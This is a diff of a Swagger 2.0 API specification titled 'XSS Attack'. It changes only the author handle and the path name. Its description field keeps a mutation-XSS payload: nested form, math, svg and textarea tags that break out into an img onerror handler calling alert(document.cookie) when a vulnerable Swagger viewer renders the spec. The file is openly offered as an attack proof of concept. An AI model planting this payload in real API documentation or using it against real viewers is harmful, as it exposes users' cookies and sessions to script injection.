@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY M0X0101
+  title: XSS Attack BY adrianalvird
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
 
@@ -15,13 +15,13 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /M0X0101:
+  /adrianalvird:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-        - M0X0101_XSS_D
+        - adrianalvird_XSS_D
       operationId: findAccounts
       summary: Finds all accounts
   '/accounts/groupid/{id}':
